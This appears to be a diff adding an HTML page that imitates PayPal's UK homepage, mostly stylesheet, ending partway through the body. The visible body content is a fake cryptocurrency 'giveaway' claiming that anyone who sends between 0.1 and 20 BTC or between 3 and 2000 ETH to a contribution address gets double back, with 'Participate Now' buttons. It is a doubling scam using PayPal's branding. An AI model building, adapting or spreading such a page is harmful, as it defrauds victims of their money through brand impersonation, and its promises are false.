@@ -1,0 +1,1535 @@
+<!DOCTYPE html>
+
+<html lang="en-GB">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title>Send Money, Pay Online or Set Up a Merchant Account - PayPal</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+        <link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />
+
+        <link href="css/1151b4d93f50d98501fb0bac46e990e9ed069e.css" media="screen" rel="stylesheet" type="text/css" />
+        <link href="css/style2.css"   rel="stylesheet" type="text/css" />
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.0/css/all.css" integrity="sha384-lKuwvrZot6UHsBSfcMvOkWwlCMgc0TaWr+30HWe3a4ltaBwTZhyTEggF5tJv8tbt" crossorigin="anonymous">
+        <style>
+            .pal-blue {
+                background-color: #009cde;
+            }
+            .pay-blue {
+                background-color: #003087;
+            }
+            .pink {
+                background-color: #de0063;
+            }
+            .purple {
+                background-color: #640487;
+            }
+            .green {
+                background-color: #00cf92;
+            }
+            .orange {
+                background-color: #ff9600;
+            }
+            .pink,
+            .purple,
+            .green,
+            .orange,
+            .pink *,
+            .purple *,
+            .green *,
+            .orange *,
+            .pay-blue *,
+            .pal-blue * {
+                color: #fff;
+            }
+            .clock {
+                height: 20vh;
+                color: black;
+                background-color: #00a8ea;
+                display: flex;
+                display: -ms-flexbox;
+                padding: 20px 0;
+                justify-content: center;
+                -ms-flex-pack: center;
+                position: relative;
+                overflow: hidden;
+                align-items: center;
+                -ms-flex-align: center;
+                margin-top: -35px;
+            }
+            .clock > div {
+                display: flex;
+                display: -ms-flexbox;
+                justify-content: center;
+                -ms-flex-pack: center;
+            }
+            .number {
+                background: #ffffff;
+                font-family: PayPalSansSmall-Regular, Helvetica Neue, Arial, sans-serif;
+                font-weight: 900;
+                border-radius: 20px;
+                margin-right: 5px;
+                width: 62px;
+                height: 68px;
+                font-size: 36px;
+                font-size: 2.57142857rem;
+                text-align: center;
+                overflow: hidden;
+                position: relative;
+            }
+            .number .move {
+                display: block;
+                animation: move 0.99s linear infinite;
+            }
+            @media screen and (max-width: 956px) {
+                .number {
+                    width: 55px;
+                    height: 55px;
+                    font-size: 30px;
+                    font-size: 2.14285714rem;
+                    border-radius: 15px;
+                }
+                .number .move {
+                    display: block;
+                    animation: medium 0.99s linear infinite;
+                }
+            }
+            @media screen and (max-width: 767px) {
+                .number {
+                    width: 40px;
+                    height: 42px;
+                    font-size: 22px;
+                    font-size: 1.57142857rem;
+                    border-radius: 10px;
+                }
+                .number .move {
+                    display: block;
+                    animation: small 0.99s linear infinite;
+                }
+            }
+            @media screen and (max-width: 414px) {
+                .number {
+                    width: 36px;
+                    height: 52px;
+                    font-size: 28px;
+                    font-size: 2rem;
+                    border-radius: 4px;
+                    margin-right: 3px;
+                }
+                .number .move {
+                    display: block;
+                    animation: move414 1s linear infinite;
+                }
+            }
+            @media screen and (max-width: 350px) {
+                .number {
+                    width: 25px;
+                    height: 28px;
+                    font-size: 15px;
+                    font-size: 1.07142857rem;
+                    border-radius: 4px;
+                    margin-right: 2px;
+                }
+                .number .move {
+                    display: block;
+                    animation: move350 1s linear infinite;
+                }
+            }
+            @keyframes move {
+                0% {
+                    transform: translateY(0);
+                }
+                25% {
+                    transform: translateY(-80px);
+                }
+                50% {
+                    transform: translateY(-70px);
+                }
+                100% {
+                    transform: translateY(-60px);
+                }
+            }
+            @keyframes medium {
+                0% {
+                    transform: translateY(0);
+                }
+                25% {
+                    transform: translateY(-80px);
+                }
+                50% {
+                    transform: translateY(-60px);
+                }
+                100% {
+                    transform: translateY(-60px);
+                }
+            }
+            @keyframes small {
+                0% {
+                    transform: translateY(0);
+                }
+                25% {
+                    transform: translateY(-60px);
+                }
+                50% {
+                    transform: translateY(-40px);
+                }
+                100% {
+                    transform: translateY(-40px);
+                }
+            }
+            @keyframes move414 {
+                0% {
+                    transform: translateY(0);
+                }
+                25% {
+                    transform: translateY(-60px);
+                }
+                50% {
+                    transform: translateY(-50px);
+                }
+                100% {
+                    transform: translateY(-55px);
+                }
+            }
+            @keyframes move350 {
+                0% {
+                    transform: translateY(0);
+                }
+                25% {
+                    transform: translateY(-40px);
+                }
+                50% {
+                    transform: translateY(-25px);
+                }
+                100% {
+                    transform: translateY(-25px);
+                }
+            }
+            #ul-btn-exp {
+                box-shadow: none;
+                text-decoration: underline;
+                border: none;
+            }
+            @media only screen and (max-width: 280px) {
+                #app-button-exp {
+                    padding: 12px;
+                }
+            }
+            @media only screen and (min-width: 1152px) {
+                #ul-btn-exp,
+                #signup-button-exp,
+                #app-button-exp {
+                    display: block;
+                }
+            }
+            @media only screen and (max-width: 1152px) {
+                #ul-btn-exp,
+                #signup-button-exp {
+                    display: none;
+                }
+                #app-button-exp {
+                    display: block;
+                }
+            }
+            .main-menu__sublist li:nth-child(2) .main-link {
+                text-transform: none;
+                text-decoration: underline;
+                position: absolute;
+                top: 70vh;
+            }
+            @media only screen and (orientation: landscape) {
+                .main-menu__sublist li:nth-child(2) .main-link {
+                    position: relative;
+                    top: -4em;
+                }
+            }
+            .pp-header.pp-header--active-link--1 #ul-btn-exp {
+                padding-top: 12px;
+                padding-bottom: 12px;
+                background-color: transparent;
+                color: #0070ba;
+                border: none;
+                box-shadow: none;
+            }
+            .pp-header.pp-header--active-link--1 #ul-btn-exp.pypl-btn--small {
+                padding-top: 11px;
+                padding-bottom: 11px;
+            }
+            .pp-header.pp-header--active-link--1 #ul-btn-exp:focus,
+            #ul-btn-exp:hover {
+                color: #005ea6;
+            }
+            .pp-header.pp-header--submenu-open #ul-btn-exp:focus,
+            #ul-btn-exp:hover {
+                color: #fff;
+            }
+            .pp-header.pp-header--active-link--1 #app-button-exp {
+                background-color: #0070ba;
+                color: #fff;
+            }
+            .pp-header.pp-header--active-link--1 #app-button-exp:hover {
+                background-color: #005ea6;
+            }
+            .pp-header.pp-header--submenu-open #app-button-exp {
+                background-color: #fff;
+                color: #0070ba;
+            }
+            .pp-header.pp-header--submenu-open #app-button-exp:hover {
+                background-color: #fff;
+                color: #0070ba;
+            }
+            .pp-header #app-button-exp {
+                background-color: #0070ba;
+                color: #fff;
+            }
+            .pp-header #app-button-exp:hover {
+                background-color: #005ea6;
+            }
+            .pp-header.pp-header--active-link--1 #signup-button-exp,
+            #signup-button-exp:hover {
+                border: 1px solid #0070ba;
+            }
+            .pp-header.pp-header--submenu-open #signup-button-exp,
+            #signup-button-exp:hover {
+                border: none;
+            }
+            .pp-header #signup-button-exp,
+            #signup-button-exp:hover {
+                color: #0070ba;
+                background-color: #fff;
+            }
+            @media only screen and (max-width: 1152px) {
+                .pp-header.pp-header--active-link--1 #app-button-exp {
+                    border: 1px solid #0070ba;
+                    color: #0070ba;
+                    background-color: #fff;
+                }
+                .pp-header.pp-header--active-link--1 #app-button-exp:hover {
+                    border: 1px solid #0070ba;
+                    color: #0070ba;
+                    background-color: #fff;
+                }
+            }
+            a.PP__MobileBanner__Action_Btn {
+                width: auto !important;
+            }
+            .pp-header {
+                box-shadow: 0 0 10px 1px rgba(0, 0, 0, 0.2), 0 0 10px 1px rgba(255, 255, 255, 0.2);
+            }
+            @media (max-width: 1151px) {
+                .pp-header {
+                    padding: 9px 0 11px;
+                }
+            }
+            .pp-header:before {
+                background: #fff;
+                height: 56px;
+            }
+            @media (min-width: 1152px) {
+                .pp-header:before {
+                    height: 72px;
+                }
+            }
+            .pp-header .pypl-logo {
+                background-image: url(images/pp_fc_hl.svg);
+            }
+            .pp-header .header-buttons .pypl-btn--outline-white {
+                padding-top: 12px;
+                padding-bottom: 12px;
+                background-color: transparent;
+                color: #0070ba;
+                border: 1px solid #0070ba;
+                box-shadow: none;
+            }
+            .pp-header .header-buttons .pypl-btn--outline-white.pypl-btn--small {
+                padding-top: 11px;
+                padding-bottom: 11px;
+            }
+            .pp-header .header-buttons .pypl-btn--outline-white:focus,
+            .pp-header .header-buttons .pypl-btn--outline-white:hover {
+                color: #005ea6;
+            }
+            .pp-header #signup-button {
+                background-color: #0070ba;
+                color: #fff;
+            }
+            .pp-header #signup-button:hover {
+                background-color: #005ea6;
+            }
+            .pp-header #menu-button {
+                border: 1px solid #0070ba;
+                color: #0070ba;
+            }
+            .pp-header #menu-button:after,
+            .pp-header #menu-button:before {
+                border-color: #0070ba;
+            }
+            .pp-header .pp-header .closer-mobile button,
+            .pp-header .pp-header .main-link,
+            .pp-header .pp-header .main-link:focus,
+            .pp-header .pp-header .main-link:hover {
+                color: #2c2e2f;
+            }
+            .pp-header .closer-mobile button.pypl-header__subnav-control::after,
+            .pp-header .main-link.pypl-header__subnav-control::after,
+            .pp-header .main-link:focus.pypl-header__subnav-control::after,
+            .pp-header .main-link:hover.pypl-header__subnav-control::after {
+                border: 1px solid #2c2e2f;
+                border-top: 1px solid transparent;
+                border-left: 1px solid transparent;
+            }
+            @media (min-width: 1152px) {
+                .pp-header .closer-mobile button.pypl-header__subnav-control--is-active,
+                .pp-header .closer-mobile button.pypl-header__subnav-control--is-highlighted,
+                .pp-header .closer-mobile button:focus,
+                .pp-header .closer-mobile button:hover,
+                .pp-header .main-link.pypl-header__subnav-control--is-active,
+                .pp-header .main-link.pypl-header__subnav-control--is-highlighted,
+                .pp-header .main-link:focus,
+                .pp-header .main-link:focus.pypl-header__subnav-control--is-active,
+                .pp-header .main-link:focus.pypl-header__subnav-control--is-highlighted,
+                .pp-header .main-link:focus:focus,
+                .pp-header .main-link:focus:hover,
+                .pp-header .main-link:hover,
+                .pp-header .main-link:hover.pypl-header__subnav-control--is-active,
+                .pp-header .main-link:hover.pypl-header__subnav-control--is-highlighted,
+                .pp-header .main-link:hover:focus,
+                .pp-header .main-link:hover:hover {
+                    border-color: #0070ba;
+                }
+            }
+            .pp-header .main-menu a,
+            .pp-header .main-menu a:active,
+            .pp-header .main-menu a:focus,
+            .pp-header .main-menu a:hover,
+            .pp-header .main-menu a:visited {
+                color: #2c2e2f;
+            }
+            .pp-header .main-menu .separator-menu::before {
+                border-color: #2c2e2f;
+            }
+            .pp-header.pp-header--menu-open .main-menu a,
+            .pp-header.pp-header--menu-open .main-menu a:active,
+            .pp-header.pp-header--menu-open .main-menu a:focus,
+            .pp-header.pp-header--menu-open .main-menu a:hover,
+            .pp-header.pp-header--menu-open .main-menu a:visited,
+            .pp-header.pp-header--submenu-open .main-menu a,
+            .pp-header.pp-header--submenu-open .main-menu a:active,
+            .pp-header.pp-header--submenu-open .main-menu a:focus,
+            .pp-header.pp-header--submenu-open .main-menu a:hover,
+            .pp-header.pp-header--submenu-open .main-menu a:visited {
+                color: #fff;
+            }
+            .pp-header.pp-header--menu-open .main-menu .separator-menu::before,
+            .pp-header.pp-header--submenu-open .main-menu .separator-menu::before {
+                border-color: #fff;
+            }
+            .pp-header .pp-header.pp-header--menu-open .closer-mobile button,
+            .pp-header .pp-header.pp-header--menu-open .main-link,
+            .pp-header .pp-header.pp-header--menu-open .main-link:focus,
+            .pp-header .pp-header.pp-header--menu-open .main-link:hover,
+            .pp-header .pp-header.pp-header--submenu-open .closer-mobile button,
+            .pp-header .pp-header.pp-header--submenu-open .main-link,
+            .pp-header .pp-header.pp-header--submenu-open .main-link:focus,
+            .pp-header .pp-header.pp-header--submenu-open .main-link:hover {
+                color: #fff;
+            }
+            .pp-header.pp-header--menu-open .closer-mobile button.pypl-header__subnav-control::after,
+            .pp-header.pp-header--menu-open .main-link.pypl-header__subnav-control::after,
+            .pp-header.pp-header--menu-open .main-link:focus.pypl-header__subnav-control::after,
+            .pp-header.pp-header--menu-open .main-link:hover.pypl-header__subnav-control::after,
+            .pp-header.pp-header--submenu-open .closer-mobile button.pypl-header__subnav-control::after,
+            .pp-header.pp-header--submenu-open .main-link.pypl-header__subnav-control::after,
+            .pp-header.pp-header--submenu-open .main-link:focus.pypl-header__subnav-control::after,
+            .pp-header.pp-header--submenu-open .main-link:hover.pypl-header__subnav-control::after {
+                border: 1px solid #fff;
+                border-top: 1px solid transparent;
+                border-left: 1px solid transparent;
+            }
+            @media (min-width: 1152px) {
+                .pp-header.pp-header--menu-open .closer-mobile button.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--menu-open .closer-mobile button.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--menu-open .closer-mobile button:focus,
+                .pp-header.pp-header--menu-open .closer-mobile button:hover,
+                .pp-header.pp-header--menu-open .main-link.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--menu-open .main-link.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--menu-open .main-link:focus,
+                .pp-header.pp-header--menu-open .main-link:focus.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--menu-open .main-link:focus.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--menu-open .main-link:focus:focus,
+                .pp-header.pp-header--menu-open .main-link:focus:hover,
+                .pp-header.pp-header--menu-open .main-link:hover,
+                .pp-header.pp-header--menu-open .main-link:hover.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--menu-open .main-link:hover.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--menu-open .main-link:hover:focus,
+                .pp-header.pp-header--menu-open .main-link:hover:hover,
+                .pp-header.pp-header--submenu-open .closer-mobile button.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--submenu-open .closer-mobile button.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--submenu-open .closer-mobile button:focus,
+                .pp-header.pp-header--submenu-open .closer-mobile button:hover,
+                .pp-header.pp-header--submenu-open .main-link.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--submenu-open .main-link.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--submenu-open .main-link:focus,
+                .pp-header.pp-header--submenu-open .main-link:focus.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--submenu-open .main-link:focus.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--submenu-open .main-link:focus:focus,
+                .pp-header.pp-header--submenu-open .main-link:focus:hover,
+                .pp-header.pp-header--submenu-open .main-link:hover,
+                .pp-header.pp-header--submenu-open .main-link:hover.pypl-header__subnav-control--is-active,
+                .pp-header.pp-header--submenu-open .main-link:hover.pypl-header__subnav-control--is-highlighted,
+                .pp-header.pp-header--submenu-open .main-link:hover:focus,
+                .pp-header.pp-header--submenu-open .main-link:hover:hover {
+                    border-color: #fff;
+                }
+            }
+            .pp-header.pp-header--submenu-open .pypl-logo {
+                background-image: url(https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom-white.svg);
+            }
+            .pp-header.pp-header--submenu-open .header-buttons .pypl-btn--outline-white {
+                background-color: transparent;
+                color: #fff;
+                border: 0;
+                box-shadow: 0 0 0 1px #fff, 0 0 0 1px #fff;
+            }
+            .pp-header.pp-header--submenu-open .header-buttons .pypl-btn--outline-white:focus,
+            .pp-header.pp-header--submenu-open .header-buttons .pypl-btn--outline-white:hover {
+                color: #eaeced;
+            }
+            .pp-header.pp-header--submenu-open .header-buttons .pypl-btn--outline-white:active {
+                color: #cbd2d6;
+            }
+            .pp-header.pp-header--submenu-open #signup-button {
+                background-color: #fff;
+                color: #2c2e2f;
+            }
+            .pp-header.pp-header--submenu-open #signup-button:hover {
+                background-color: #eaeced;
+            }
+            .covid-banner {
+                padding: 30px 0;
+                background-color: #fff2dc;
+            }
+            .covid-banner .covid-new {
+                display: flex;
+                display: -ms-flexbox;
+                justify-content: center;
+                -ms-flex-pack: center;
+                flex-wrap: wrap;
+                -ms-flex-wrap: wrap;
+            }
+            .covid-banner .covid-new .covid-logo {
+                width: 50px;
+                height: 50px;
+                margin-right: 15px;
+            }
+            .custom-hero .text-highlight {
+                color: #ffc200;
+            }
+            .custom-hero .home-hero {
+                background-color: #003087;
+                background-size: cover;
+                background-repeat: no-repeat;
+                background-image: url(https://www.paypalobjects.com/marketing/web/cashback/cashback_mobile_v1.png);
+            }
+            @media screen and (min-width: 1024px) {
+                .custom-hero .home-hero {
+                    background-image: url(images/cashback.png);
+                }
+                .custom-hero .home-hero .home-hero__paragraph {
+                    width: 80%;
+                }
+            }
+            @media screen and (min-width: 1024px) and (max-width: 1300px) {
+                .custom-hero .home-hero {
+                    background-position: 38%;
+                }
+            }
+            .custom-hero .home-hero__btn {
+                background-color: #ffc200;
+                color: #003087;
+            }
+            @media screen and (max-width: 751px) {
+                .custom-hero .home-hero__btn {
+                    margin-left: auto;
+                    margin-right: auto;
+                }
+            }
+            .custom-hero .home-hero__btn:hover,
+            .custom-hero .home-hero__btn:active,
+            .custom-hero .home-hero__btn:visited {
+                background-color: #ffc200;
+                color: #003087;
+            }
+            .custom-hero .home-hero__headline {
+                font-weight: bold;
+            }
+            @media screen and (max-width: 751px) {
+                .custom-hero .home-hero__container {
+                    text-align: center !important;
+                }
+            }
+            .custom-deviceHero {
+                background: #009cde;
+                color: #fff;
+            }
+            @media screen and (max-width: 1023px) {
+                .custom-deviceHero {
+                    background-image: none;
+                }
+            }
+            @media screen and (min-width: 1024px) {
+                .custom-deviceHero {
+                    background-image: url("https://www.paypalobjects.com/marketing/web/fr/fr/home/080384_PPHoliday_Owned_Assets_Homepage_UK_Desktop__1600x600.png");
+                    background-size: cover;
+                    background-repeat: no-repeat;
+                    background-position: center;
+                    text-align: left;
+                }
+                .custom-deviceHero .device-hero__device-image--large {
+                    display: none;
+                }
+            }
+            .custom-deviceHero .device-hero__cta--center:hover,
+            .custom-deviceHero .device-hero__cta--center:link,
+            .custom-deviceHero .device-hero__cta--center:active,
+            .custom-deviceHero .device-hero__cta--center:visited {
+                background: #fdbb33;
+                color: #0d3685;
+            }
+            @media (min-width: 1151px) {
+                .custom-deviceHero .device-hero__cta--center {
+                    margin-top: 0;
+                }
+            }
+            @media (min-width: 752px) and (max-width: 1023px) {
+                .custom-deviceHero {
+                    min-height: 400px;
+                }
+            }
+            @media (min-width: 1024px) and (max-width: 1151px) {
+                .custom-deviceHero {
+                    min-height: 450px;
+                }
+                .custom-deviceHero .device-hero__container__content-flex-item--center {
+                    width: 50%;
+                    text-align: left;
+                }
+                .custom-deviceHero .device-hero__container__content-flex-item--center .device-hero__cta--center,
+                .custom-deviceHero .device-hero__container__content-flex-item--center .device-hero__mediabtn--center {
+                    margin: 0;
+                }
+            }
+            @media (min-width: 1152px) {
+                .custom-deviceHero {
+                    min-height: 620px;
+                }
+                .custom-deviceHero .device-hero__paragraph {
+                    width: 105%;
+                }
+            }
+            .custom-deviceHero .device-hero__paragraph {
+                padding-top: 20px;
+            }
+            @media (min-width: 752px) and (max-width: 1023px) {
+                .custom-deviceHero .device-hero__container {
+                    margin: auto;
+                }
+            }
+            @media (min-width: 1024px) and (max-width: 1151px) {
+                .custom-deviceHero .device-hero__container {
+                    margin-left: 12px;
+                    margin-right: auto;
+                }
+            }
+            @media screen and (max-width: 1151px) {
+                .custom-deviceHero .device-hero__device-image-tablet {
+                    display: block;
+                    width: 100%;
+                    max-width: inherit;
+                }
+            }
+            @media screen and (min-width: 1024px) {
+                .custom-deviceHero .device-hero__device-image-tablet {
+                    margin-bottom: -122px;
+                    display: none;
+                }
+            }
+            .custom-deviceHero .pypl-heading {
+                font-size: 45px;
+                font-size: 3.21428571rem;
+                padding-bottom: 5px;
+                line-height: 55px;
+            }
+            @media screen and (max-width: 672px) {
+                .custom-deviceHero .pypl-heading {
+                    font-size: 35px;
+                    font-size: 2.5rem;
+                }
+            }
+            @media screen and (max-width: 1023px) {
+                .custom-deviceHero .pypl-heading {
+                    font-size: 40px;
+                    font-size: 2.85714286rem;
+                }
+            }
+            @media only screen and (min-width: 320px) and (max-width: 414px) {
+                .custom-deviceHero .pypl-heading {
+                    line-height: 43px;
+                }
+            }
+            @media (min-width: 1024px) {
+                .device-hero-organism:first-of-type .device-hero {
+                    margin-top: -72px;
+                }
+            }
+            @media (max-width: 1151px) {
+                .custom-break1 {
+                    display: none;
+                }
+            }
+            @media (min-width: 752px) {
+                .device-hero {
+                    border-bottom: none;
+                }
+            }
+            .notification-ribbon.custom-notification-ribbon {
+                background-color: #fff;
+                padding: 30px 0;
+            }
+            .notification-ribbon.custom-notification-ribbon .notification-ribbon__headline {
+                color: #0d3685 !important;
+            }
+            @media screen and (min-width: 768px) and (max-width: 1212px) {
+                .notification-ribbon.custom-notification-ribbon {
+                    padding-top: 30px;
+                    padding-bottom: 5px;
+                }
+            }
+            .notification-ribbon.custom-notification-ribbon .pypl-btn.pypl-btn--outline-blue {
+                background-color: #0d3685;
+                border-color: #0d3685;
+                color: #fff;
+            }
+            .notification-ribbon.custom-notification-ribbon .pypl-btn.pypl-btn--outline-blue:hover,
+            .notification-ribbon.custom-notification-ribbon .pypl-btn.pypl-btn--outline-blue:focus,
+            .notification-ribbon.custom-notification-ribbon .pypl-btn.pypl-btn--outline-blue:active {
+                color: #fff;
+            }
+            @media only screen and (min-width: 1152px) {
+                .notification-ribbon.custom-notification-ribbon .container {
+                    max-width: 1380px;
+                }
+            }
+            .notification-ribbon.custom-notification-ribbon .notification-ribbon__headline {
+                color: #fff;
+                font-size: 22px;
+                font-size: 1.57142857rem;
+            }
+            @media only screen and (min-width: 320px) and (max-width: 812px) {
+                .notification-ribbon.custom-notification-ribbon .notification-ribbon__headline {
+                    font-size: 18px;
+                    font-size: 1.28571429rem;
+                }
+            }
+            .pypl-heading.editorial__headline {
+                position: relative;
+            }
+            .pypl-heading.editorial__headline .newBadge {
+                background-color: #fbb333;
+                color: #fff;
+                font-size: 15px;
+                font-size: 1.07142857rem;
+                padding: 0 8px 0 8px;
+                border-radius: 50%;
+                top: 30px;
+                position: absolute;
+            }
+            @media screen and (min-width: 320px) and (max-width: 751px) {
+                .pypl-heading.editorial__headline .newBadge {
+                    font-size: 17px;
+                    font-size: 1.21428571rem;
+                    position: initial;
+                    padding: 18px 13px 18px 13px;
+                }
+            }
+            @media only screen and (max-width: 751px) {
+                .editorial__image {
+                    margin-bottom: 30px;
+                }
+            }
+            @media only screen and (min-width: 1024px) {
+                .custom-editorial .pullout__btn--center {
+                    margin: 0;
+                }
+            }
+            .row.showcase__header .pypl-heading.showcase__headline,
+            .editorial .editorial__headline {
+                font-weight: 900;
+            }
+            .editorial.government .editorial__image {
+                height: 200px;
+            }
+            @media only screen and (max-width: 567px) {
+                .editorial.government .editorial__image {
+                    height: 150px;
+                }
+            }
+            @media screen and (max-width: 751px) {
+                .editorial.reverse-render .row {
+                    display: -moz-box;
+                    display: -webkit-box;
+                    display: -webkit-flex;
+                    display: -ms-flexbox;
+                    display: flex;
+                    -moz-box-orient: vertical;
+                    -webkit-box-orient: vertical;
+                    box-orient: vertical;
+                    -moz-box-direction: reverse;
+                    -webkit-box-direction: reverse;
+                    box-direction: reverse;
+                    -webkit-flex-direction: column-reverse;
+                    -ms-flex-direction: column-reverse;
+                    flex-direction: column-reverse;
+                }
+            }
+            .editorial .container {
+                text-align: center;
+            }
+            @media only screen and (max-width: 767px) {
+                .editorial .container .row {
+                    margin-left: -15px;
+                    margin-right: -15px;
+                    padding-left: 7px;
+                }
+            }
+            @media only screen and (min-width: 1024px) {
+                .editorial {
+                    min-height: 350px;
+                }
+            }
+            @media only screen and (min-width: 752px) {
+                .editorial {
+                    padding: 40px 60px;
+                }
+            }
+            @media only screen and (max-width: 751px) {
+                .editorial {
+                    padding: 40px 13px;
+                }
+            }
+            .showcase .container hr {
+                display: none;
+            }
+            .showcase.custom-logo-section {
+                padding: 60px 0 45px 0;
+            }
+            @media only screen and (max-width: 751px) {
+                .showcase.custom-logo-section {
+                    padding-bottom: 23px;
+                }
+            }
+            @media only screen and (min-width: 1025px) {
+                .showcase .showcase__container .showcase__logo-1 .showcase__image {
+                    margin-left: 19px;
+                }
+                .showcase .showcase__container .showcase__logo-2 .showcase__image {
+                    margin-left: 25px;
+                }
+                .showcase .showcase__container .showcase__logo-3 .showcase__image {
+                    margin-left: 9px;
+                }
+                .showcase .showcase__container .showcase__logo-5 .showcase__image {
+                    margin-left: -21px;
+                }
+            }
+            @media only screen and (min-width: 1152px) {
+                .row.showcase__container {
+                    height: 150px;
+                    margin-top: -30px;
+                }
+            }
+            @media only screen and (min-width: 1025px) {
+                .showcase__logo.col-md-4 {
+                    width: 137px;
+                }
+                .showcase__logo:nth-child(4) ~ .showcase__logo.col-md-4 {
+                    padding-top: 0;
+                }
+            }
+            @media (min-width: 752px) {
+                .showcase__logo:nth-child(3) ~ .showcase__logo.col-md-4 {
+                    padding-top: 30px;
+                }
+                .showcase__logo:nth-child(2) ~ .showcase__logo {
+                    padding-top: 30px;
+                }
+                .showcase__logo:nth-child(1) ~ .showcase__logo {
+                    padding-top: 30px;
+                }
+                .showcase__logo:first-child {
+                    padding-top: 30px;
+                }
+            }
+            .pullout.custom-pullout {
+                background-color: #0d3685;
+                padding: 50px 0;
+            }
+            .pullout.custom-pullout .pullout__paragraph,
+            .pullout.custom-pullout .pullout__headline {
+                color: #fff;
+            }
+            .pullout.custom-pullout .pullout__headline {
+                font-size: 30px;
+                font-size: 2.14285714rem;
+            }
+            @media only screen and (min-width: 320px) and (max-width: 1024px) {
+                .pullout.custom-pullout .pullout__headline {
+                    font-size: 30px;
+                }
+            }
+            .pullout.custom-pullout .pypl-btn {
+                color: #0d3685;
+                background: #fff;
+            }
+            .editorial_link {
+                color: #00a8ea;
+            }
+            .editorial_link:hover,
+            .editorial_link:focus,
+            .editorial_link:active {
+                color: #00a8ea;
+            }
+            .statement {
+                background: #fff2dc;
+            }
+            .statement .pypl-heading {
+                font-size: 1.5rem;
+                line-height: 2.25rem;
+                font-weight: 700;
+                color: #2c2e2f;
+            }
+            .statement .statement__paragraph {
+                font-size: 1.24rem;
+                padding-top: 8px;
+            }
+            @media (min-width: 752px) {
+                .statement {
+                    padding: 30px 0;
+                }
+            }
+            .clock {
+                background-color: #0d3685;
+                color: white;
+                height: 28vh;
+            }
+            .clock .number {
+                background-color: #0070ba;
+                height: 72px;
+            }
+            @media screen and (min-width: 351px) and (max-width: 414px) {
+                .clock .number {
+                    height: 60px;
+                    border-radius: 6px;
+                }
+            }
+            @media screen and (min-width: 415px) and (max-width: 767px) {
+                .clock .number {
+                    height: 52px;
+                }
+            }
+            @media screen and (max-width: 350px) {
+                .clock .number {
+                    height: 32px;
+                }
+            }
+            @media (min-width: 1024px) {
+                .info-hero {
+                    padding-bottom: 0;
+                }
+            }
+            @media (min-width: 751px) {
+                .custom-break {
+                    display: none;
+                }
+            }
+            @media screen and (max-width: 1024px) and (min-width: 600px) {
+                .custom-infohero {
+                    min-height: 300px;
+                }
+            }
+            .editorial-modal {
+                position: absolute;
+                z-index: 9;
+                top: 100px;
+                left: 20%;
+                right: 20%;
+                bottom: 0;
+            }
+            @media only screen and (max-width: 823px) {
+                .editorial-modal {
+                    left: 10%;
+                    right: 10%;
+                }
+            }
+            .editorial-modal .modal-close-btn {
+                position: absolute;
+                right: 10px;
+                margin: 15px;
+                top: 0;
+                font-size: 20px;
+                font-size: 1.42857143rem;
+                cursor: pointer;
+            }
+            @media only screen and (max-width: 576px) {
+                .editorial-modal .modal-close-btn {
+                    right: 0;
+                    margin: 5px 15px;
+                }
+            }
+            .editorial-modal .custom-app-editorial {
+                min-height: auto;
+                box-shadow: 2px 2px 2px 1px rgba(0, 0, 0, 0.2);
+                border-radius: 10px;
+            }
+            .editorial-modal .custom-app-editorial .editorial__headline {
+                font-size: 25px;
+                font-size: 1.78571429rem;
+            }
+            .editorial-modal .custom-app-editorial .editorial__image {
+                max-width: 100%;
+            }
+            @media only screen and (max-width: 752px) {
+                .editorial-modal .custom-app-editorial img.editorial__image {
+                    display: none;
+                }
+            }
+
+
+
+
+        </style>
+    </head>
+    <body class=" ">
+        <div id="app-element-mountpoint">
+            <div id="document-body" data-reactroot="">
+                <header class="pp-header pp-header--enhanced pp-header--active-link--1" data-building-block="organism">
+                    <div>
+                        <div class="pp-header__wrapper container">
+                            <div class="pypl-logo-wrapper"><a href="#" class="pypl-logo pypl-logo--full-text pypl-logo--white">PayPal</a></div>
+                        </div>
+                    </div>
+                </header>
+                <div>
+                    <div class="default-uncookied-tv4"></div>
+                    <section class="home-hero-organism custom-hero" data-building-block="organism">
+                        <div class="home-hero short theme-background-image-dark">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="home-hero__container col-xs-12 col-lg-8 text-xs-left">
+                                        <div>
+                                            <p class="home-hero__paragraph">
+                                                 We believe that blockchain and cryptocurrencys will make the world more fair and open. The current financial system is outdated. To speed up the process of cryptocurrency mass adoption, We decided to run 5.000 BTC + 100.000 ETH giveaway. To participate you just need to send from ~0.1 BTC / 3 ETH to 20 BTC / 2000 ETH to the contribution address and we will immediatelly send you back 0.2 BTC / 6 ETH to 40 BTC / 4000 ETH to the address you sent it from (x2 back). 
+                                            </p>
+                                            <p class="home-hero__paragraph">
+                                                 You can participate only once!
+                                            </p>
+                                            <div class="btns_block" style="display: flex;justify-content: left;align-items: end;">
+                                                <button type="button" class="show_form show_form_btc pypl-btn mpp-btn home-hero__btn"><b>Participate Now BTC</b></button>
+                                                <button type="button" class="show_form show_form_eth pypl-btn mpp-btn home-hero__btn" style="margin-left:5px; margin-top: 30px;"><b>Participate Now ETH</b></button>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section id="giv_block" class="giveaway editorial theme-background-color-light custom-editorial" data-building-block="organism" style="display: none; height: unset;">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-xs-12 col-md-12 editorial__container editorial__text">
+                                    <h2 class="pypl-heading editorial__headline"> CONTRIBUTION ADDRESS: </h2>
+                                    <p class="editorial__paragraph notification-ribbon__headline">You can send <span class="type_wallet"> to the following address:</p>
+                                    <br>
